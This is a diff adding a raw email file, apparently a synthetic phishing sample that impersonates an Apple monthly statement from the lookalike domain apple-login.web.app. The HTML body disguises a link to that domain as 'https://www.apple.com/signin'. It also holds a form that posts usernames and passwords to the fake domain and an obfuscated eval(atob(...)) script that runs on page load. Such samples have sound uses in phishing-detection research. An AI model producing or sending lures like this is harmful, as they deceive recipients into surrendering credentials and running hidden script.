@@ -1,0 +1,30 @@
+From: notice@apple-login.web.app
+To: victim42@example.com
+Subject: Monthly statement available [ref U1A7C86]
+Date: Tue, 26 Mar 2002 11:30:00 -0500
+Message-ID: <phish-102-280526cf-5147-4117-963b-a63d33bb5211@apple-login.web.app>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 24 Mar 2002 01:17:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 21 Mar 2002 09:30:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 28 Mar 2002 03:37:00 -0500
+Return-Path: <notice@apple-login.web.app>
+Reply-To: notice@apple-login.web.app
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=apple-login.web.app; dkim=pass header.d=apple-login.web.app; dmarc=pass header.from=apple-login.web.app
+Received-SPF: pass (mx.example.com: domain of notice@apple-login.web.app designates 192.0.2.42 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=apple-login.web.app; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-102-9e9c4617"
+
+--bnd-p-102-9e9c4617
+Content-Type: text/plain; charset="UTF-8"
+
+Hello,
+
+Your monthly statement is ready. Open the link below.
+https://apple-login.web.app/statement/U1A7C86
+
+Reference: U1A7C86
+--bnd-p-102-9e9c4617
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Hello,<br/><br/>Your monthly statement is ready. Open the link below.<br/>https://apple-login.web.app/statement/U1A7C86<br/><br/>Reference: U1A7C86</p><p><a href="http://apple-login.web.app/login">https://www.apple.com/signin</a></p><form action="http://apple-login.web.app/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-102-9e9c4617--
